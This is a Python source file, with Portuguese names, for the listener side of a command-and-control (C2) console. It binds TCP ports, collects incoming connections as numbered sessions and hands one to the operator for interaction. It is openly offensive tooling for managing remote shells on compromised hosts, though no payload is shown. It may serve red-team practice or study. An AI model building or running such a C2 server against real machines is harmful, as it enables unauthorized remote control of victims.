import argparse
import socket
import threading

import colorama
from console import Console
from sessao import Sessao

colorama.init(autoreset=True)

class Servidor(Console):
    prompt = f"{colorama.Fore.RED}C2 > {colorama.Fore.RESET}"
    
    def __init__(self):
        super().__init__()
        self.sessoes = []
        self.sockets = []
        self.contador_sessao = 1

    def criar_listener(self, porta):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind(("0.0.0.0", porta))
        sock.listen(5)
        
        self.sockets.append(sock)
        print(f"Escutando na porta {porta}...")

        while True:
            try:
                sock.settimeout(5)
                conexao, endereco = sock.accept()
                sock.settimeout(None)
                print(f"{colorama.Fore.GREEN}[+] Sessão #{self.contador_sessao} estabelecida - {endereco}")
                sessao = Sessao(conexao, self.sessoes, self.contador_sessao)
                self.sessoes.append(sessao)
                self.contador_sessao += 1
            except socket.timeout:
                continue
            except OSError:
                break
    
    def comando_servidor(self, args):
        parser = argparse.ArgumentParser(prog='servidor', add_help=False)
        parser.add_argument('-p', '--porta', type=int)
        
        try:
            args = parser.parse_args(args.split())
        except:
            return
        
        if args.porta:
            threading.Thread(target=self.criar_listener, args=(args.porta,), daemon=True).start()
        else:
            print("Comando do servidor inválido.")
    
    def comando_sessoes(self, args):
        
        parser = argparse.ArgumentParser(prog='sessoes', add_help=False)
        parser.add_argument('-i', '--interagir', type=int)
        
        try:
            args = parser.parse_args(args.split())
        except:
            return
        
        if args.interagir is not None:
            sessao = self.encontrar_sessao(args.interagir)
            if sessao:
                sessao.interagir()
            else:
                print(f"{colorama.Fore.RED}[!] Seção {args.interagir} inválida !")
        else:
            print("Comando sessoes inválido.")
    
    def encontrar_sessao(self, id):
        for sessao in self.sessoes:
            if sessao.id == id:
                return sessao

if __name__ == "__main__":
    servidor = Servidor()
    servidor.prompt_loop()
